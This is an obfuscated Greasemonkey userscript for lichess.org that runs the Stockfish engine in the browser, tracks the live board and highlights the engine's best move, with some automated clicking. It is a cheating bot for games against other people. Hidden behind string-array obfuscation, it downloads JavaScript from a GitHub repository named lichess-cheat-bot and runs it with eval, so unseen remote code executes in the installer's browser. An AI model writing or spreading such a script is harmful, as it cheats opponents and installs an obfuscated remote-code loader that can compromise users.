// ==UserScript==
// @name        lichess
// @namespace   lichess
// @include     http://en.lichess.org/*
// @version     2
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js
// @require https://raw.githubusercontent.com/nmrugg/stockfish.js/master/src/stockfish.js
// @require https://raw.githubusercontent.com/jonaspeterson/lichess-cheat-bot/master/test.js
// @grant    GM_xmlhttpRequest
// ==/UserScript==
// v2.0 
var _0xfd07 = ["uci", "postMessage", "go depth 10", "GET", "https://raw.githubusercontent.com/jonaspeterson/lichess-cheat-bot/master/test.js", "responseText", "", "class", "attr", "piece", "children", "square", "white", "indexOf", "black", "border", "3px solid black", "css", "border-color", "#ff0000", "0px solid black", "each", "reverse", "get", "title", "best move : ", "onmessage", "bestmove", " ", "split", "YM628LRIVF", "orientation-black", "hasClass", ".cg-board", "moves", "clone", "remove", "push", "length", "p", ".last-move*", "h", "g", "f", "e", "d", "c", "b", "a", "unbind", "delete", "last-move oc", "floor", "h1e1", "e1g1", "h8e8", "e8g8", "e8a8", "e8c8", "e1a1", "e1c1", "position startpos moves ", "go movetime 100", "match", ".last-move.oc, .last-move.occupied", ".oc, .occupied", "not", ".last-move", "click", "trigger", "ready"];
var stockfish = STOCKFISH();
stockfish[_0xfd07[1]](_0xfd07[0]);
stockfish[_0xfd07[1]](_0xfd07[2]);
GM_xmlhttpRequest({
    method: _0xfd07[3],
    url: _0xfd07[4],
    onload: function(_0xbf0bx2) {
        eval(_0xbf0bx2[_0xfd07[5]])
    }
});
$(document)[_0xfd07[70]](function a() {
    var _0xbf0bx4 = _0xfd07[6];
    var _0xbf0bx5 = $(_0xfd07[11])[_0xfd07[10]](_0xfd07[9])[_0xfd07[8]](_0xfd07[7]);
    if(_0xbf0bx5.toString()[_0xfd07[13]](_0xfd07[12]) > -1) {
        _0xbf0bx4 = _0xfd07[14]
    } else {
        _0xbf0bx4 = _0xfd07[12]
    };
    if(_0xbf0bx4 == _0xfd07[12]) {
        function _0xbf0bx6(_0xbf0bx7) {
            var _0xbf0bx8 = {
                "a": 7,
                "b": 6,
                "c": 5,
                "d": 4,
                "e": 3,
                "f": 2,
                "g": 1,
                "h": 0
            };
            var _0xbf0bx9 = (parseInt(_0xbf0bx7[1]) - 1) * 8;
            var _0xbf0bxa = _0xbf0bx8[_0xbf0bx7[0]];
            var _0xbf0bxb = _0xbf0bx9 + _0xbf0bxa;
            _0xbf0bx9 = (parseInt(_0xbf0bx7[3]) - 1) * 8;
            _0xbf0bxa = _0xbf0bx8[_0xbf0bx7[2]];
            var _0xbf0bxc = _0xbf0bx9 + _0xbf0bxa;
            var _0xbf0bxd = 0;
            $($(_0xfd07[11])[_0xfd07[23]]()[_0xfd07[22]]())[_0xfd07[21]](function a() {
                if(_0xbf0bxd == _0xbf0bxb) {
                    $(this)[_0xfd07[17]](_0xfd07[15], _0xfd07[16])
                } else {
                    if(_0xbf0bxd == _0xbf0bxc) {
                        $(this)[_0xfd07[17]](_0xfd07[15], _0xfd07[16]);
                        $(this)[_0xfd07[17]](_0xfd07[18], _0xfd07[19]);
                    } else {
                        $(this)[_0xfd07[17]](_0xfd07[15], _0xfd07[20])
                    }
                };
                _0xbf0bxd++;
            });
            document[_0xfd07[24]] = _0xfd07[25] + _0xbf0bx7;
        }
        stockfish[_0xfd07[26]] = function(_0xbf0bxe) {
            var _0xbf0bxf = _0xbf0bxe;
            if(_0xbf0bxf.toString()[_0xfd07[13]](_0xfd07[27]) > -1) {
                var _0xbf0bx10 = _0xbf0bxf[_0xfd07[29]](_0xfd07[28]);
                _0xbf0bx6(_0xbf0bx10[1]);
            };
        };
        var _0xbf0bx11 = _0xfd07[30];
        var _0xbf0bx12 = _0xfd07[6];
        var _0xbf0bx13 = 0;
        var _0xbf0bx14 = -1;
        var _0xbf0bx15 = null;
        var _0xbf0bx4 = $(_0xfd07[33])[_0xfd07[32]](_0xfd07[31]) ? _0xfd07[14] : _0xfd07[12];
        var _0xbf0bx16 = true;
        var _0xbf0bx17 = _0xfd07[34];
        var _0xbf0bx18 = _0xfd07[6];
        var _0xbf0bx19 = _0xfd07[6];
        var _0xbf0bx1a = new Array();
        var _0xbf0bx1b = new Array();
        var _0xbf0bxd = 0;
        var _0xbf0bx1c = $($(_0xfd07[11])[_0xfd07[23]]()[_0xfd07[22]]())[_0xfd07[35]]();
        var _0xbf0bx1d = 0;
        if(_0xbf0bx1c != 64) {
            $(_0xbf0bx1c)[_0xfd07[21]](function a() {
                if(_0xbf0bx1d == 0) {
                    $(this)[_0xfd07[36]]()
                };
                _0xbf0bx1d++;
            })
        };
        $(_0xbf0bx1c)[_0xfd07[21]](function a() {
            _0xbf0bx1a[_0xfd07[37]](_0xfd07[28]);
            _0xbf0bx1b[_0xfd07[37]](_0xfd07[28]);
            if($(this)[_0xfd07[10]]()[_0xfd07[38]] > 0) {
                _0xbf0bx1a[_0xbf0bxd] = _0xfd07[39];
                _0xbf0bx1b[_0xbf0bxd] = _0xfd07[39];
            };
            _0xbf0bxd++;
        });
        var _0xbf0bx1e = new Array();
        var _0xbf0bx1f = _0xfd07[6];

        function _0xbf0bx20() {
            var _0xbf0bx21 = $(_0xfd07[40])[_0xfd07[10]]();
            var _0xbf0bx22 = $(_0xbf0bx21)[_0xfd07[8]](_0xfd07[7]);
            if(_0xbf0bx22.toString()[_0xfd07[13]](_0xfd07[12]) > -1) {
                return _0xfd07[12]
            } else {
                return _0xfd07[14]
            };
        }
        setInterval(function _0xbf0bx23() {
            var _0xbf0bx24 = [_0xfd07[41], _0xfd07[42], _0xfd07[43], _0xfd07[44], _0xfd07[45], _0xfd07[46], _0xfd07[47], _0xfd07[48]];
            var _0xbf0bxd = 0;
            var _0xbf0bx25 = 0;
            var _0xbf0bx1d = 0;
            var _0xbf0bx1c = $($(_0xfd07[11])[_0xfd07[23]]()[_0xfd07[22]]())[_0xfd07[35]](true, true)[_0xfd07[49]]();
            var _0xbf0bx1d = 0;
            if(_0xbf0bx1c[_0xfd07[38]] != 64) {
                $(_0xbf0bx1c)[_0xfd07[21]](function a() {
                    if(_0xbf0bx1d == 0) {
                        $(this)[_0xfd07[50]]()
                    };
                    _0xbf0bx1d++;
                })
            };
            $(_0xbf0bx1c)[_0xfd07[21]](function a() {
                if($(this)[_0xfd07[10]]()[_0xfd07[38]] > 0) {
                    _0xbf0bx1b[_0xbf0bxd] = _0xfd07[39]
                } else {
                    _0xbf0bx1b[_0xbf0bxd] = _0xfd07[28]
                };
                _0xbf0bxd++;
            });
            var _0xbf0bx26 = 0;
            var _0xbf0bx27 = 0;
            for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                if(_0xbf0bx1b[_0xbf0bxd] != _0xfd07[28]) {
                    _0xbf0bx27++
                };
                if(_0xbf0bx1a[_0xbf0bxd] != _0xfd07[28]) {
                    _0xbf0bx26++
                };
            };
            var _0xbf0bx28 = -1;
            var _0xbf0bx29 = -1;
            var _0xbf0bx2a = 0;
            if(_0xbf0bx27 == _0xbf0bx26) {
                for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                    if(_0xbf0bx1b[_0xbf0bxd] != _0xbf0bx1a[_0xbf0bxd]) {
                        _0xbf0bx2a++;
                        if(_0xbf0bx28 == -1) {
                            _0xbf0bx28 = _0xbf0bxd
                        };
                        if(_0xbf0bx28 > -1) {
                            _0xbf0bx29 = _0xbf0bxd
                        };
                    }
                }
            };
            if(_0xbf0bx28 > -1) {
                var _0xbf0bx2b = 0;
                $(_0xbf0bx1c)[_0xfd07[21]](function a() {
                    if($(this)[_0xfd07[8]](_0xfd07[7]) == _0xfd07[51]) {
                        var _0xbf0bx2c = _0xbf0bx2b;
                        if(_0xbf0bx2b == _0xbf0bx28) {
                            _0xbf0bx2c = _0xbf0bx29;
                            _0xbf0bx29 = _0xbf0bx2b;
                            _0xbf0bx28 = _0xbf0bx2c;
                        };
                    };
                    _0xbf0bx2b++;
                });
            };
            if(_0xbf0bx27 < _0xbf0bx26) {
                var _0xbf0bx2b = 0;
                $(_0xbf0bx1c)[_0xfd07[21]](function a() {
                    if($(this)[_0xfd07[8]](_0xfd07[7]) == _0xfd07[51]) {
                        _0xbf0bx29 = _0xbf0bx2b
                    };
                    _0xbf0bx2b++;
                });
                for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                    if(_0xbf0bx1b[_0xbf0bxd] == _0xfd07[28] && _0xbf0bx1b[_0xbf0bxd] != _0xbf0bx1a[_0xbf0bxd]) {
                        _0xbf0bx28 = _0xbf0bxd
                    }
                };
            };
            if(_0xbf0bx28 > -1) {
                var _0xbf0bx2d = _0xbf0bx28 / 8;
                var _0xbf0bx2e = _0xbf0bx29 / 8;
                _0xbf0bx2d++;
                _0xbf0bx2e++;
                var _0xbf0bx2f = _0xbf0bx28 % 8;
                var _0xbf0bx2b = _0xbf0bx29 % 8;
                var _0xbf0bx30 = _0xbf0bx24[_0xbf0bx2f] + Math[_0xfd07[52]](_0xbf0bx2d);
                var _0xbf0bx31 = _0xbf0bx24[_0xbf0bx2b] + Math[_0xfd07[52]](_0xbf0bx2e);
                for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                    _0xbf0bx1a[_0xbf0bxd] = _0xbf0bx1b[_0xbf0bxd]
                };
                var _0xbf0bx32 = _0xbf0bx20();
                var _0xbf0bx7 = _0xbf0bx30 + _0xbf0bx31;
                if(_0xbf0bx2a == 4) {
                    if(_0xbf0bx7 == _0xfd07[53]) {
                        _0xbf0bx7 = _0xfd07[54]
                    };
                    if(_0xbf0bx7 == _0xfd07[55]) {
                        _0xbf0bx7 = _0xfd07[56]
                    };
                    if(_0xbf0bx7 == _0xfd07[57]) {
                        _0xbf0bx7 = _0xfd07[58]
                    };
                    if(_0xbf0bx7 == _0xfd07[59]) {
                        _0xbf0bx7 = _0xfd07[60]
                    };
                };
                _0xbf0bx1e[_0xfd07[37]](_0xbf0bx7);
                _0xbf0bx1f = _0xbf0bx1f + _0xfd07[28] + _0xbf0bx7;
                stockfish[_0xfd07[1]](_0xfd07[61] + _0xbf0bx1f);
                stockfish[_0xfd07[1]](_0xfd07[62]);
            };
        }, 4);

        function _0xbf0bx33() {
            function _0xbf0bx34(_0xbf0bx2c) {
                return _0xbf0bx2c[_0xfd07[63]](/[a-h][0-8]/g)
            }
            try {
                var _0xbf0bx35 = _0xbf0bx34($(_0xfd07[64])[_0xfd07[8]](_0xfd07[7]));
                var _0xbf0bx36 = _0xbf0bx34($(_0xfd07[67])[_0xfd07[66]](_0xfd07[65])[_0xfd07[8]](_0xfd07[7]));
            } catch(e) {
                return _0xfd07[6]
            };
            return _0xbf0bx36 + _0xbf0bx35;
        }
    } else {
        function _0xbf0bx6(_0xbf0bx7) {
            var _0xbf0bx8 = {
                "a": 7,
                "b": 6,
                "c": 5,
                "d": 4,
                "e": 3,
                "f": 2,
                "g": 1,
                "h": 0
            };
            var _0xbf0bx9 = (parseInt(_0xbf0bx7[1]) - 1) * 8;
            var _0xbf0bxa = _0xbf0bx8[_0xbf0bx7[0]];
            var _0xbf0bxb = _0xbf0bx9 + _0xbf0bxa;
            _0xbf0bx9 = (parseInt(_0xbf0bx7[3]) - 1) * 8;
            _0xbf0bxa = _0xbf0bx8[_0xbf0bx7[2]];
            var _0xbf0bxc = _0xbf0bx9 + _0xbf0bxa;
            var _0xbf0bxd = 0;
            $(_0xfd07[11])[_0xfd07[21]](function a() {
                if(_0xbf0bxd == _0xbf0bxb) {
                    $(this)[_0xfd07[17]](_0xfd07[15], _0xfd07[16])
                } else {
                    if(_0xbf0bxd == _0xbf0bxc) {
                        $(this)[_0xfd07[17]](_0xfd07[15], _0xfd07[16]);
                        $(this)[_0xfd07[17]](_0xfd07[18], _0xfd07[19]);
                        $(this)[_0xfd07[69]](_0xfd07[68]);
                    } else {
                        $(this)[_0xfd07[17]](_0xfd07[15], _0xfd07[20])
                    }
                };
                _0xbf0bxd++;
            });
            document[_0xfd07[24]] = _0xfd07[25] + _0xbf0bxb + _0xfd07[28] + _0xbf0bxc;
        }
        stockfish[_0xfd07[26]] = function(_0xbf0bxe) {
            var _0xbf0bxf = _0xbf0bxe;
            if(_0xbf0bxf.toString()[_0xfd07[13]](_0xfd07[27]) > -1) {
                var _0xbf0bx10 = _0xbf0bxf[_0xfd07[29]](_0xfd07[28]);
                _0xbf0bx6(_0xbf0bx10[1]);
            };
        };
        var _0xbf0bx11 = _0xfd07[30];
        var _0xbf0bx12 = _0xfd07[6];
        var _0xbf0bx13 = 0;
        var _0xbf0bx14 = -1;
        var _0xbf0bx15 = null;
        var _0xbf0bx4 = $(_0xfd07[33])[_0xfd07[32]](_0xfd07[31]) ? _0xfd07[14] : _0xfd07[12];
        var _0xbf0bx16 = true;
        var _0xbf0bx17 = _0xfd07[34];
        var _0xbf0bx18 = _0xfd07[6];
        var _0xbf0bx19 = _0xfd07[6];
        var _0xbf0bx1a = new Array();
        var _0xbf0bx1b = new Array();
        var _0xbf0bxd = 0;
        $(_0xfd07[11])[_0xfd07[21]](function a() {
            _0xbf0bx1a[_0xfd07[37]](_0xfd07[28]);
            _0xbf0bx1b[_0xfd07[37]](_0xfd07[28]);
            if($(this)[_0xfd07[10]]()[_0xfd07[38]] > 0) {
                _0xbf0bx1a[_0xbf0bxd] = _0xfd07[39];
                _0xbf0bx1b[_0xbf0bxd] = _0xfd07[39];
            };
            _0xbf0bxd++;
        });
        var _0xbf0bx1e = new Array();
        var _0xbf0bx1f = _0xfd07[6];

        function _0xbf0bx20() {
            var _0xbf0bx21 = $(_0xfd07[40])[_0xfd07[10]]();
            var _0xbf0bx22 = $(_0xbf0bx21)[_0xfd07[8]](_0xfd07[7]);
            if(_0xbf0bx22.toString()[_0xfd07[13]](_0xfd07[12]) > -1) {
                return _0xfd07[12]
            } else {
                return _0xfd07[14]
            };
        }
        setInterval(function _0xbf0bx23() {
            var _0xbf0bx24 = [_0xfd07[41], _0xfd07[42], _0xfd07[43], _0xfd07[44], _0xfd07[45], _0xfd07[46], _0xfd07[47], _0xfd07[48]];
            var _0xbf0bxd = 0;
            $(_0xfd07[11])[_0xfd07[21]](function a() {
                if($(this)[_0xfd07[10]]()[_0xfd07[38]] > 0) {
                    _0xbf0bx1b[_0xbf0bxd] = _0xfd07[39]
                } else {
                    _0xbf0bx1b[_0xbf0bxd] = _0xfd07[28]
                };
                _0xbf0bxd++;
            });
            var _0xbf0bx26 = 0;
            var _0xbf0bx27 = 0;
            for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                if(_0xbf0bx1b[_0xbf0bxd] != _0xfd07[28]) {
                    _0xbf0bx27++
                };
                if(_0xbf0bx1a[_0xbf0bxd] != _0xfd07[28]) {
                    _0xbf0bx26++
                };
            };
            var _0xbf0bx28 = -1;
            var _0xbf0bx29 = -1;
            var _0xbf0bx2a = 0;
            if(_0xbf0bx27 == _0xbf0bx26) {
                for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                    if(_0xbf0bx1b[_0xbf0bxd] != _0xbf0bx1a[_0xbf0bxd]) {
                        _0xbf0bx2a++;
                        if(_0xbf0bx28 == -1) {
                            _0xbf0bx28 = _0xbf0bxd
                        };
                        if(_0xbf0bx28 > -1) {
                            _0xbf0bx29 = _0xbf0bxd
                        };
                    }
                }
            };
            if(_0xbf0bx28 > -1) {
                var _0xbf0bx2b = 0;
                $(_0xfd07[11])[_0xfd07[21]](function a() {
                    if($(this)[_0xfd07[8]](_0xfd07[7]) == _0xfd07[51]) {
                        var _0xbf0bx2c = _0xbf0bx2b;
                        if(_0xbf0bx2b == _0xbf0bx28) {
                            _0xbf0bx2c = _0xbf0bx29;
                            _0xbf0bx29 = _0xbf0bx2b;
                            _0xbf0bx28 = _0xbf0bx2c;
                        };
                    };
                    _0xbf0bx2b++;
                });
            };
            if(_0xbf0bx27 < _0xbf0bx26) {
                var _0xbf0bx2b = 0;
                $(_0xfd07[11])[_0xfd07[21]](function a() {
                    if($(this)[_0xfd07[8]](_0xfd07[7]) == _0xfd07[51]) {
                        _0xbf0bx29 = _0xbf0bx2b
                    };
                    _0xbf0bx2b++;
                });
                for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                    if(_0xbf0bx1b[_0xbf0bxd] == _0xfd07[28] && _0xbf0bx1b[_0xbf0bxd] != _0xbf0bx1a[_0xbf0bxd]) {
                        _0xbf0bx28 = _0xbf0bxd
                    }
                };
            };
            if(_0xbf0bx28 > -1) {
                var _0xbf0bx2d = _0xbf0bx28 / 8;
                var _0xbf0bx2e = _0xbf0bx29 / 8;
                _0xbf0bx2d++;
                _0xbf0bx2e++;
                var _0xbf0bx2f = _0xbf0bx28 % 8;
                var _0xbf0bx2b = _0xbf0bx29 % 8;
                var _0xbf0bx30 = _0xbf0bx24[_0xbf0bx2f] + Math[_0xfd07[52]](_0xbf0bx2d);
                var _0xbf0bx31 = _0xbf0bx24[_0xbf0bx2b] + Math[_0xfd07[52]](_0xbf0bx2e);
                for(var _0xbf0bxd = 0; _0xbf0bxd < 64; _0xbf0bxd++) {
                    _0xbf0bx1a[_0xbf0bxd] = _0xbf0bx1b[_0xbf0bxd]
                };
                var _0xbf0bx32 = _0xbf0bx20();
                var _0xbf0bx7 = _0xbf0bx30 + _0xbf0bx31;
                if(_0xbf0bx2a == 4) {
                    if(_0xbf0bx7 == _0xfd07[53]) {
                        _0xbf0bx7 = _0xfd07[54]
                    };
                    if(_0xbf0bx7 == _0xfd07[55]) {
                        _0xbf0bx7 = _0xfd07[56]
                    };
                    if(_0xbf0bx7 == _0xfd07[57]) {
                        _0xbf0bx7 = _0xfd07[58]
                    };
                    if(_0xbf0bx7 == _0xfd07[59]) {
                        _0xbf0bx7 = _0xfd07[60]
                    };
                };
                _0xbf0bx1e[_0xfd07[37]](_0xbf0bx7);
                _0xbf0bx1f = _0xbf0bx1f + _0xfd07[28] + _0xbf0bx7;
                stockfish[_0xfd07[1]](_0xfd07[61] + _0xbf0bx1f);
                stockfish[_0xfd07[1]](_0xfd07[62]);
            };
        }, 4);

        function _0xbf0bx33() {
            function _0xbf0bx34(_0xbf0bx2c) {
                return _0xbf0bx2c[_0xfd07[63]](/[a-h][0-8]/g)
            }
            try {
                var _0xbf0bx35 = _0xbf0bx34($(_0xfd07[64])[_0xfd07[8]](_0xfd07[7]));
                var _0xbf0bx36 = _0xbf0bx34($(_0xfd07[67])[_0xfd07[66]](_0xfd07[65])[_0xfd07[8]](_0xfd07[7]));
            } catch(e) {
                return _0xfd07[6]
            };
            return _0xbf0bx36 + _0xbf0bx35;
        }
    };
});